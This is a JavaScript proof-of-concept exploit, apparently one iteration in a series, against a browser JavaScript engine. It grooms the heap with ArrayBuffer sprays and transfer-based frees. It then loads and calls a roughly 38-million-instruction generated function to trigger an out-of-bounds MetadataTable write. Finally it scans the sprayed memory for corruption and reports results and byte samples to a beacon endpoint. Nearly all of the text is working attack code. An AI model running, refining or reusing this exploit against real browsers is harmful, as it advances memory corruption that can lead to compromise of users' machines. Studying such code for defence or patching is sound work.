// p162 — MetadataTable overflow with function CALL trigger
// Key fix from p160: actually CALL the function to trigger CodeBlock linking
// finishCreation() runs during first call, NOT during script load
// Spray filled with 0xAA to detect any byte modification from OOB sweep
// Beacon prefix: V162-
(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V162-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  var runNum = 1;
  try {
    runNum = parseInt(sessionStorage.getItem('v162run') || '0') + 1;
    sessionStorage.setItem('v162run', String(runNum));
  } catch(e) {}
  B('BOOT-R' + runNum);

  if (runNum > 2) { B('BAIL-LOOPING'); return; }

  var BUF_SZ = 100112;
  var TOTAL = 400;
  var bufs = new Array(TOTAL);
  var views = [];

  for (var i = 0; i < TOTAL; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
  }
  B('SPRAY-' + TOTAL);

  for (var i = 1; i < TOTAL; i += 2) {
    var v = new Uint8Array(bufs[i]);
    for (var j = 0; j < BUF_SZ; j++) v[j] = 0xAA;
    views.push(v);
  }
  B('MARKED-' + views.length);

  var freed = 0;
  for (var i = 0; i < TOTAL; i += 2) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      freed++;
    } catch(e) {}
    bufs[i] = null;
  }
  bufs = null;
  B('FREED-' + freed);

  setTimeout(function() {
    for (var g = 0; g < 30; g++) {
      var junk = [];
      for (var j = 0; j < 100000; j++) junk.push({x: j, y: j * 2});
      junk = null;
    }
    B('GC-DONE');

    var src = 'window.__p162fn=function(a){';
    var chunk = 'a();a();a();a();a();a();a();a();a();a();';
    var big = '';
    for (var k = 0; k < 1000; k++) big += chunk;
    var parts = [src];
    for (var k = 0; k < 3834; k++) parts.push(big);
    var rem = 38348816 - 38340000;
    var remStr = '';
    for (var k = 0; k < rem; k++) remStr += 'a();';
    parts.push(remStr);
    parts.push('};window.__p162ok=1;');

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null; big = null; chunk = null; src = null; remStr = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('LOADED-' + (window.__p162ok ? 'OK' : 'FAIL'));

      // WeakRef diagnostic: does GC collect structuredClone return value?
      var weakResult = 'SKIP';
      try {
        var tb = new ArrayBuffer(1024);
        var clone = structuredClone(tb, {transfer: [tb]});
        var wr = new WeakRef(clone);
        clone = null;
        for (var g = 0; g < 5; g++) {
          var j2 = [];
          for (var jj = 0; jj < 50000; jj++) j2.push({});
          j2 = null;
        }
        weakResult = wr.deref() !== undefined ? 'ALIVE' : 'DEAD';
      } catch(e) {
        weakResult = 'ERR';
      }
      B('WEAKREF-' + weakResult);

      // THE KEY FIX: actually CALL the function to trigger linking
      // finishCreation() iterates all 38M instructions, writing metadata OOB
      // First a() uses in-bounds metadata (entry 0), calls callback, callback throws
      B('CALLING');
      var t0 = Date.now();
      var callResult = 'NOCATCH';
      try {
        window.__p162fn(function() { throw 'V162STOP'; });
      } catch(e) {
        var dt = Date.now() - t0;
        callResult = 'OK';
        B('SURVIVED-' + dt + 'ms');
      }
      if (callResult === 'NOCATCH') {
        B('CALL-RETURNED-NO-THROW');
      }

      // Scan spray for modification (any byte != 0xAA)
      var hit = 0;
      var totalChanged = 0;
      var firstDetail = '';
      for (var i = 0; i < views.length; i++) {
        var v = views[i];
        var changed = 0;
        for (var j = 0; j < v.length; j++) {
          if (v[j] !== 0xAA) changed++;
        }
        if (changed > 0) {
          hit++;
          totalChanged += changed;
          if (firstDetail.length < 80) {
            firstDetail += 'V' + i + ':' + changed + ' ';
          }
        }
      }

      if (hit > 0) {
        B('HIT-' + hit + '-OF-' + views.length + '-CHG-' + totalChanged);
        if (firstDetail) B('DETAIL-' + firstDetail.trim());
        for (var i = 0; i < views.length; i++) {
          var v = views[i];
          for (var j = 0; j < v.length; j++) {
            if (v[j] !== 0xAA) {
              var sample = '';
              for (var s = j; s < j + 16 && s < v.length; s++) {
                var h = v[s].toString(16);
                if (h.length < 2) h = '0' + h;
                sample += h;
              }
              B('SAMPLE-V' + i + '-OFF' + j + '-' + sample);
              i = views.length;
              break;
            }
          }
        }
      } else {
        B('MISS-' + views.length + '-ANYMOD-NO');
      }
      B('DONE');
    };

    sc.src = url;
    document.head.appendChild(sc);
  }, 500);
})();
